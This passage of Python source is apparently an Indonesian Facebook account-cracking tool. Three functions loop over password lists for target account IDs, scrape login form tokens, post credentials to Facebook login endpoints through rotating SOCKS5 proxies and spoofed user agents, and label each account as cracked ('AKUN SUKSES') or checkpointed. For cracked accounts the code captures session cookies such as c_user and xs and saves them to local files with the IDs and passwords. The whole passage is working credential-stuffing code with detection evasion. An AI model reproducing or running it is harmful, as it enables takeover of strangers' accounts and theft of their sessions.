            fankyimut = random.choice(['https://www.facebook.com/login/device-based/regular/login/', 'https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110', 'https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzM1NzQxNzE0LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next'])
            po = ses.post(fankyimut, headers=head, data=data, allow_redirects=False,proxies=proxs)
            if "checkpoint" in ses.cookies.get_dict().keys():
                cp += 1
                tree = Tree(Panel.fit(f"""{K2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
                tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"{color_panel}"))
                tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=f"{color_panel}"))
                tree.add(Panel(f"{M2}{ua}{P2}", style=f"{color_panel}"))
                prints(tree)
                open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok += 1
                coki = ses.cookies.get_dict()
                kuki = ("datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";")
                tree = Tree(Panel.fit(f"""{H2}  AKUN SUKSES {P2}""", style=f"{color_panel}"), guide_style="bold grey100")
                tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=f"{color_panel}"))
                tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"{color_panel}"))
                tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
                tree.add(Panel(f"{U2}{kuki}{P2}", style=f"{color_panel}"))
                prints(tree)
                open("OK/" + okc, "a").write(idf + "|" + pw + "|" +kuki+ "\n")
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop += 1

#-------------------[ CRACK-MAIN ]------------#
def fanky_b_api(idf, pwv):
    global loop, ok, cp
    rr = random.randint
    rc = random.choice
    bo = random.choice([m, k, h, b, u, x])
    # ua = random.choice(ugen)
    ua = random.choice(ugen)
    ses = requests.Session()
    prog.update(des, description=f" {K2}•{H2} FANKY IP {P2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
    prog.advance(des)
    for pw in pwv:
        try:
            if 'ya' in ualuh:ua = ualu[0]
            nip = random.choice(prox)
            proxs = {'http': 'socks5://' + nip}
            requ = ses.get('https://iphone.facebook.com/login/?next=https%3A%2F%2Fiphone.facebook.com%2Fhome.php%3Fsubno_key%3DAaEyozoW-ko1gxrSEUeJ9fUpRVkkP1HMhoWy1EH63He11teI0OQpfobqrALFkRv_Lqkqdaqx8qJOZngljKkmpxUG2zEqjf-8pwWTUiKNRQiPAB-h7flx-ZqmDrKtHXPjtmKiy6DbpT2WJ0Vd1V-TWsaFkcdiTE5R97Ayft7cps-NZFyxjxsWJPsdtCpkwqFEXGd0LDSB6iI_9_1HETRP-01OUtCj2-uGaGCYIYHEpq9jkFaJNkh5pvFJ9QUNvv1rPzixrv5iPchmFbyZpom1qxM4DzmYvT5H0Ga0x_DDBvGoQvJ3uCW5KF_7LtY2DkS2Om0%26hrc%3D1%26refsrc%3Ddeprecated&ref=dbl&fl&login_from_aymh=1&refid=9')
            data = {
                "lsd": re.search('name="lsd" value="(.*?)"', requ.text).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', requ.text).group(1),
                "m_ts": re.search('name="m_ts" value="(.*?)"', requ.text).group(1),
                "li": re.search('name="li" value="(.*?)"', requ.text).group(1),
                "try_number": "0",
                "unrecognized_tries": "0",
                "prefill_contact_point": idf,
                "prefill_source": "provided_or_soft_matched",
                "prefill_type": "contact_point",
                "first_prefill_source": "provided_or_soft_matched",
                "first_prefill_type": "contact_point",
                "had_cp_prefilled": "true",
                "had_password_prefilled": "false",
                "is_smart_lock": "false",
                "_fb_noscript": "true",
                "email": idf,
                "pass": pw
            }
            head = {
                "User-Agent": ua,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Referer": "https://iphone.facebook.com/",
                "Origin": "https://iphone.facebook.com",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-User": "?1",
                "DNT": "1"
            }
            fankyimut = random.choice(['https://www.facebook.com/login/device-based/regular/login/', 'https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=9'])
            po = ses.post(fankyimut, headers=head, data=data, allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                cp += 1
                tree = Tree(Panel.fit(f"""{K2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
                tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"{color_panel}"))
                tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=f"{color_panel}"))
                tree.add(Panel(f"{M2}{ua}{P2}", style=f"{color_panel}"))
                prints(tree)
                open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok += 1
                coki = ses.cookies.get_dict()
                kuki = ("datr=" + coki["datr"] + ";" + "sb=" + coki["sb"] + ";" + "locale=id_ID" + ";" + "c_user=" + coki["c_user"] + ";" + "xs=" + coki["xs"] + ";" + "fr=" + coki["fr"] + ";")
                tree = Tree(Panel.fit(f"""{H2}  AKUN SUKSES {P2}""", style=f"{color_panel}"), guide_style="bold grey100")
                tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=f"{color_panel}"))
                tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"{color_panel}"))
                tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
                tree.add(Panel(f"{U2}{kuki}{P2}", style=f"{color_panel}"))
                prints(tree)
                open("OK/" + okc, "a").write(idf + "|" + pw + "|" +kuki+ "\n")
                break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop += 1
#-------------------[ CRACK-MAIN ]------------#
def fankytouch(idf,pwv):
	global loop,ok,cp
	rr = random.randint
	rc = random.choice
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen) 
	ses = requests.Session()
	prog.update(des, description=f" {K2}•{H2} FANKY MTOUCH {P2}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			getfan = "https://mtouch.facebook.com/login.php"
			requ = ses.get(getfan)
			koki = (";").join([ "%s=%s" % (key, value) for key, value in requ.cookies.get_dict().items() ])
			headers = {"User-Agent": ua, "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "Accept-Encoding": "gzip, deflate", "Connection": "keep-alive", "Referer": "https://mtouch.facebook.com/", "Origin": "https://mtouch.facebook.com", "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1", "DNT": "1", "TE": "trailers", "X-Requested-With": "com.facebook.katana"}
			data = {"lsd": re.search('name="lsd" value="(.*?)"', requ.text).group(1), "jazoest": re.search('name="jazoest" value="(.*?)"', requ.text).group(1), "m_ts": re.search('name="m_ts" value="(.*?)"', requ.text).group(1), "li": re.search('name="li" value="(.*?)"', requ.text).group(1), "try_number": "0", "unrecognized_tries": "0", "email": idf, "pass": pw, "encpass": f"#PWD_BROWSER:0:{int(time.time())}:{pw}", "prefill_contact_point": idf, "prefill_source": "browser_dropdown", "prefill_type": "password_autofill", "first_prefill_source": "browser_dropdown", "first_prefill_type": "password_autofill", "had_cp_prefilled": "true", "had_password_prefilled": "true", "is_smart_lock": "true", "bi_xrwh": "0", "_fb_noscript": "true", "source": "login", "lgndim": "eyJ3IjoxOTIwLCJoIjoxMDgwLCJhdyI6MTkyMCwiYWgiOjEwMzEsImMiOjI0fQ==", "timezone": "-420", "lgndim": "2560,1440,2", "guid": str(uuid.uuid4()), "login_source": "login", "meta_inf_fbmeta": "", "skip_api_login": "1", "api_key": "882a8490361da98702bf97a021ddc14d", "signed_next": "1", "next": "https://mtouch.facebook.com/", "fb_dtsg": "", "checked_login": "true", "ab_test_data": "", "login_attempt": "1", "sso_device": "mobile", "sso_version": "2.0"}
			fankyurl = "https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=9"
			po = ses.post(fankyurl, headers=headers, cookies={'cookie': koki}, data=data)
			if "checkpoint" in ses.cookies.get_dict().keys():
				cp += 1
				tree = Tree(Panel.fit(f"""{K2}  AKUN CHECKPOINT{P2}""", style=f"{color_panel}"), guide_style="bold grey100")
				tree.add(Panel.fit(f"{K2}{idf} | {pw}{P2}", style=f"{color_panel}"))
				tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=f"{color_panel}"))
				tree.add(Panel(f"{M2}{ua}{P2}", style=f"{color_panel}"))
				prints(tree)
				open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok += 1
				coki = ses.cookies.get_dict()
				kuki = ("datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";")
				tree = Tree(Panel.fit(f"""{H2}  AKUN SUKSES {P2}""", style=f"{color_panel}"), guide_style="bold grey100")
				tree.add(Panel.fit(f"{H2}{idf} | {pw}{P2}", style=f"{color_panel}"))
				tree.add(Panel.fit(f"{H2}{tahun(idf)}{P2}", style=f"{color_panel}"))
				tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
				tree.add(Panel(f"{U2}{kuki}{P2}", style=f"{color_panel}"))
				prints(tree)
				open("OK/" + okc, "a").write(idf + "|" + pw + "|" +kuki+ "\n")
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

# -----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__ == "__main__":
    try:
        os.system("git pull")
    except:
        pass
    try:
        os.mkdir("OK")
    except:
        pass
    try:
        os.mkdir("CP")
    except:
        pass
    try:
        os.mkdir("data")
    except:
        pass
    try:
        os.system("touch .prox.txt")
    except:
        pass
    try:
        os.system("clear")
    except:
        pass
    menu()
    
